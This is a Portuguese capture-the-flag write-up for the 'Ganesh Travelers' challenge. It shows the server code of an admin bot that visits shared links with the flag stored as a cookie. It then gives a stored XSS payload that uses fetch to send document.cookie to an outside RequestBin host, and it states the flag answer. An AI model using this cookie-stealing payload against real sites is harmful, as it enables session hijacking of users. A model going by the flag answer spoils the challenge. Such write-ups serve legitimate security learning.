# Ganesh Travelers

**Flag:** `{Pl4y1nG_W1tH_XSS_V3ry_fuN}`

Neste desafio, podemos reparar que dentro do blog há um formulário cujos campos permitem injeção de XSS e, portanto, vamos conseguir abusar desta vulnerabilidade para tentar solucionar o desafio.

Analizando o código fonte fornecido para nós, podemos ver que quando um Link é compartilhado, é solicitado que um bot visite nossa URL contendo como Cookie a flag do desafio.

```javascript
// Rota definida no arquivo Server.js
app.post(`/visit`, async function(req, res) { 

    const targetUrl = req.body.target 
    const serverOrigin = process.env.SERVER_URL || 'http://localhost:3333/'
    
    if(!targetUrl || !targetUrl.startsWith(serverOrigin)){
        return res.status(400).json({'message': 'Link inválido!'})
    }

    await visiter.visit(targetUrl);
    
    return res.json({'message': 'Link enviado ao administrador!'})
})

// Script que visita a url compartilhada
async function visit(url) {
	const browser = await puppeteer.launch({ args: ['--no-sandbox']})
	
    var page = await browser.newPage()
	await page.setCookie({
		name: 'flag',
		value: process.env.FLAG || 'flag{admin_s3cr3t_l0l}',
		domain: process.env.SERVER_DOMAIN || 'localhost',
		samesite: 'strict'
	})
	await page.goto(url)

	await new Promise(resolve => setTimeout(resolve, 2000));
	await page.close()
	await browser.close()
}
```

Com isso nosso objetivo é roubar o cookie definido pelo admin. Primeiro vamos submeter o nosso seguinte payload XSS em algum dos campos do blog:

```html
<script>fetch('https://<meu-id>.x.pipedream.net/c=' + document.cookie)</script>
```

Veja que estamos utilizando um RequestBin para que possamos ter algum local para enviar e recuperar a flag que será enviada pelo administrador. 

Por fim, basta copiar toda a url gerada após o envio do formulário no formulário de Compartilhar Link e aguardar alguns segundos enquanto até a requisição ser recebida no RequestBin.